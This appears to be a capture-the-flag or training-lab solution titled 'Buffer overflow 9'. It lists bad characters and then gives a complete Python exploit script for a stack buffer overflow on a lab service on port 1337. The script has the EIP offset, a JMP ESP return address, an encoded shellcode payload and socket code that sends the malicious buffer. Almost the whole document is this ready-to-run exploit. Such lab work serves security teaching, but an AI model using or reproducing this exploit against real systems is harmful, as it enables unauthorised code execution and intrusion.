# Buffer overflow 9

Badchars: `\x00\x04\x3e\x3f\xe1`

## Exploit code

```python
#!/usr/bin/env python3
import socket


ip = "MACHINE_IP"
port = 1337

buf_length = 2000
prefix = "OVERFLOW9 "
offset = 1514                           # EIP offset
overflow = "A" * offset
jmp_esp = "\xf7\x11\x50\x62"

buffer = ""
buffer += prefix
buffer += overflow                      # Padding
buffer += jmp_esp                       # Overwrite saved return pointer
buffer += "\x83\xec\x10"                # NOP sled
buffer += ("\xd9\xe9\xd9\x74\x24\xf4\xba\x32\xd7\x05\xf8\x5e\x29\xc9\xb1"
	"\x52\x31\x56\x17\x83\xee\xfc\x03\x64\xc4\xe7\x0d\x74\x02\x65"
	"\xed\x84\xd3\x0a\x67\x61\xe2\x0a\x13\xe2\x55\xbb\x57\xa6\x59"
	"\x30\x35\x52\xe9\x34\x92\x55\x5a\xf2\xc4\x58\x5b\xaf\x35\xfb"
	"\xdf\xb2\x69\xdb\xde\x7c\x7c\x1a\x26\x60\x8d\x4e\xff\xee\x20"
	"\x7e\x74\xba\xf8\xf5\xc6\x2a\x79\xea\x9f\x4d\xa8\xbd\x94\x17"
	"\x6a\x3c\x78\x2c\x23\x26\x9d\x09\xfd\xdd\x55\xe5\xfc\x37\xa4"
	"\x06\x52\x76\x08\xf5\xaa\xbf\xaf\xe6\xd8\xc9\xd3\x9b\xda\x0e"
	"\xa9\x47\x6e\x94\x09\x03\xc8\x70\xab\xc0\x8f\xf3\xa7\xad\xc4"
	"\x5b\xa4\x30\x08\xd0\xd0\xb9\xaf\x36\x51\xf9\x8b\x92\x39\x59"
	"\xb5\x83\xe7\x0c\xca\xd3\x47\xf0\x6e\x98\x6a\xe5\x02\xc3\xe2"
	"\xca\x2e\xfb\xf2\x44\x38\x88\xc0\xcb\x92\x06\x69\x83\x3c\xd1"
	"\x8e\xbe\xf9\x4d\x71\x41\xfa\x44\xb6\x15\xaa\xfe\x1f\x16\x21"
	"\xfe\xa0\xc3\xe6\xae\x0e\xbc\x46\x1e\xef\x6c\x2f\x74\xe0\x53"
	"\x4f\x77\x2a\xfc\xfa\x82\xbd\xc3\x53\xfc\xbd\xac\xa1\xfc\xbc"
	"\x97\x2f\x1a\xd4\xf7\x79\xb5\x41\x61\x20\x4d\xf3\x6e\xfe\x28"
	"\x33\xe4\x0d\xcd\xfa\x0d\x7b\xdd\x6b\xfe\x36\xbf\x3a\x01\xed"
	"\xd7\xa1\x90\x6a\x27\xaf\x88\x24\x70\xf8\x7f\x3d\x14\x14\xd9"
	"\x97\x0a\xe5\xbf\xd0\x8e\x32\x7c\xde\x0f\xb6\x38\xc4\x1f\x0e"
	"\xc0\x40\x4b\xde\x97\x1e\x25\x98\x41\xd1\x9f\x72\x3d\xbb\x77"
	"\x02\x0d\x7c\x01\x0b\x58\x0a\xed\xba\x35\x4b\x12\x72\xd2\x5b"
	"\x6b\x6e\x42\xa3\xa6\x2a\x62\x46\x62\x47\x0b\xdf\xe7\xea\x56"
	"\xe0\xd2\x29\x6f\x63\xd6\xd1\x94\x7b\x93\xd4\xd1\x3b\x48\xa5"
	"\x4a\xae\x6e\x1a\x6a\xfb")
buffer += "D" * (buf_length - (len(buffer) - len(prefix)))      # Trail padding
buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("[+] Sending evil buffer of {} bytes...".format((len(buffer) - len(prefix) - 2)))
    s.send(bytes(buffer, "latin-1"))
    print("[+] Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```